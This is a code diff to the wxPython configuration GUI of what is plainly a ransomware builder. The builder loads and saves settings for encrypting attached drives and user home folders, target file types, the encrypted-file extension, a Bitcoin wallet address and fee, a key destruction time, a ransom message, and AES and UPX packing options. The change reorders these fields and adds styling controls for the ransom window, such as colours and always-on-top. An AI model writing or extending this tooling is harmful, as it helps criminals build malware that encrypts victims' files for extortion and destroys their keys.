@@ -102,7 +102,7 @@ class Gui(MainFrame):
             self.PyInstallerAesKeyTextCtrl.SetValue(config_dict["pyinstaller_aes_key"].upper())
         else:
             self.PyInstallerAesKeyTextCtrl.SetValue("")
-        # Icon File
+        # File Icon
         if "icon_file" in config_dict:
             self.IconFilePicker.SetPath(config_dict["icon_file"])
         else:
@@ -112,28 +112,6 @@ class Gui(MainFrame):
             self.UpxDirPicker.SetPath(config_dict["upx_dir"])
         else:
             self.UpxDirPicker.SetPath("")
-        # Encrypt Attached Drives
-        if "encrypt_attached_drives" in config_dict:
-            if config_dict["encrypt_attached_drives"]:
-                self.EncryptAttachedDrivesCheckbox.SetValue(True)
-            else:
-                self.EncryptAttachedDrivesCheckbox.SetValue(False)
-        # Encrypt User Home
-        if "encrypt_user_home" in config_dict:
-            if config_dict["encrypt_user_home"]:
-                self.EncryptUserHomeCheckbox.SetValue(True)
-            else:
-                self.EncryptUserHomeCheckbox.SetValue(False)
-        # Encrypted File Extension
-        if "encrypted_file_extension" in config_dict:
-            self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
-        else:
-            self.EncryptedFileExtensionTextCtrl.SetValue("")
-        # Wallet Address
-        if "wallet_address" in config_dict:
-            self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
-        else:
-            self.WalletAddressTextCtrl.SetValue("")
         # Bitcoin Fee
         if "bitcoin_fee" in config_dict:
             self.BitcoinFeeTextCtrl.SetValue(config_dict["bitcoin_fee"])
@@ -144,6 +122,23 @@ class Gui(MainFrame):
             self.KeyDestructionTimeTextCtrl.SetValue(config_dict["key_destruction_time"])
         else:
             self.KeyDestructionTimeTextCtrl.SetValue("")
+        # Wallet Address
+        if "wallet_address" in config_dict:
+            self.WalletAddressTextCtrl.SetValue(config_dict["wallet_address"])
+        else:
+            self.WalletAddressTextCtrl.SetValue("")
+        # Encrypt Attached Drives
+        if "encrypt_attached_drives" in config_dict:
+            if config_dict["encrypt_attached_drives"]:
+                self.EncryptAttachedDrivesCheckbox.SetValue(True)
+            else:
+                self.EncryptAttachedDrivesCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_attached_drives"]["default"])
+        # Encrypt User Home
+        if "encrypt_user_home" in config_dict:
+            if config_dict["encrypt_user_home"]:
+                self.EncryptUserHomeCheckbox.SetValue(True)
+            else:
+                self.EncryptUserHomeCheckbox.SetValue(BUILDER_CONFIG_ITEMS["encrypt_user_home"]["default"])
         # Max file size to encrypt
         if "max_file_size_to_encrypt" in config_dict:
             self.MaxFileSizeTextCtrl.SetValue(config_dict["max_file_size_to_encrypt"])
@@ -155,6 +150,45 @@ class Gui(MainFrame):
             self.FiletypesToEncryptTextCtrl.SetValue(filetypes)
         else:
             self.FiletypesToEncryptTextCtrl.SetValue("")
+        # Encrypted File Extension
+        if "encrypted_file_extension" in config_dict:
+            self.EncryptedFileExtensionTextCtrl.SetValue(config_dict["encrypted_file_extension"])
+        else:
+            self.EncryptedFileExtensionTextCtrl.SetValue("")
+        # Make GUI Resizeable
+        if "make_gui_resizeable" in config_dict:
+            self.MakeGuiResizeableCheckbox.SetValue(config_dict["make_gui_resizeable"])
+        # Always on Top
+        if "always_on_top" in config_dict:
+            self.AlwaysOnTopCheckbox.SetValue(config_dict["always_on_top"])
+        if "background_colour" in config_dict:
+            self.BackgroundColourPicker.SetColour(wx.Colour(
+                    config_dict["background_colour"][0],
+                    config_dict["background_colour"][1],
+                    config_dict["background_colour"][2]
+                    )
+                )
+        if "heading_font_colour" in config_dict:
+            self.HeadingFontColourPicker.SetColour(wx.Colour(
+                    config_dict["heading_font_colour"][0],
+                    config_dict["heading_font_colour"][1],
+                    config_dict["heading_font_colour"][2]
+                    )
+                )
+        if "primary_font_colour" in config_dict:
+            self.PrimaryFontColourPicker.SetColour(wx.Colour(
+                    config_dict["primary_font_colour"][0],
+                    config_dict["primary_font_colour"][1],
+                    config_dict["primary_font_colour"][2]
+                    )
+                )
+        if "secondary_font_colour" in config_dict:
+            self.SecondaryFontColourPicker.SetColour(wx.Colour(
+                    config_dict["secondary_font_colour"][0],
+                    config_dict["secondary_font_colour"][1],
+                    config_dict["secondary_font_colour"][2]
+                    )
+                )
         # Ransom Message
         if "ransom_message" in config_dict:
             self.RansomMessageTextCtrl.SetValue(config_dict["ransom_message"])
@@ -361,26 +395,38 @@ class Gui(MainFrame):
             )
         # PyInstaller AES Key
         user_input_dict["pyinstaller_aes_key"] = self.PyInstallerAesKeyTextCtrl.GetValue()
-        # PyInstaller AES Key
+        # Icon FIle
         user_input_dict["icon_file"] = self.IconFilePicker.GetPath()
         # UPX Packer Dir
         user_input_dict["upx_dir"] = self.UpxDirPicker.GetPath()
-        # Encrypt Attached Drives
-        user_input_dict["encrypt_attached_drives"] = self.EncryptAttachedDrivesCheckbox.IsChecked()
-        # Encrypt User Home
-        user_input_dict["encrypt_user_home"] = self.EncryptUserHomeCheckbox.IsChecked()
-        # Encrypted File Extension
-        user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
-        # Wallet Address
-        user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
         # Bitcoin Fee
         user_input_dict["bitcoin_fee"] = self.BitcoinFeeTextCtrl.GetValue()
         # Key Destruction Time
         user_input_dict["key_destruction_time"] = self.KeyDestructionTimeTextCtrl.GetValue()
+        # Wallet Address
+        user_input_dict["wallet_address"] = self.WalletAddressTextCtrl.GetValue()
+        # Encrypt Attached Drives
+        user_input_dict["encrypt_attached_drives"] = self.EncryptAttachedDrivesCheckbox.IsChecked()
+        # Encrypt User Home
+        user_input_dict["encrypt_user_home"] = self.EncryptUserHomeCheckbox.IsChecked()
         # Max file size to encrypt
         user_input_dict["max_file_size_to_encrypt"] = self.MaxFileSizeTextCtrl.GetValue()
-        # Max file size to encrypt
+        # Filetypes to encrypt
         user_input_dict["filetypes_to_encrypt"] = self.FiletypesToEncryptTextCtrl.GetValue()
+        # Encrypted File Extension
+        user_input_dict["encrypted_file_extension"] = self.EncryptedFileExtensionTextCtrl.GetValue()
+        # GUI Resizeable
+        user_input_dict["make_gui_resizeable"] = self.MakeGuiResizeableCheckbox.IsChecked()
+        # Always On Top
+        user_input_dict["always_on_top"] = self.AlwaysOnTopCheckbox.IsChecked()
+        # Background Colour
+        user_input_dict["background_colour"] = self.BackgroundColourPicker.GetColour().Get()
+        # Heading Font Colour
+        user_input_dict["heading_font_colour"] = self.HeadingFontColourPicker.GetColour().Get()
+        # Primary Font Colour
+        user_input_dict["primary_font_colour"] = self.PrimaryFontColourPicker.GetColour().Get()
+        # Secondary Font Colour
+        user_input_dict["secondary_font_colour"] = self.SecondaryFontColourPicker.GetColour().Get()
         # Ransom Message
         user_input_dict["ransom_message"] = self.RansomMessageTextCtrl.GetValue()
         # Debug Level
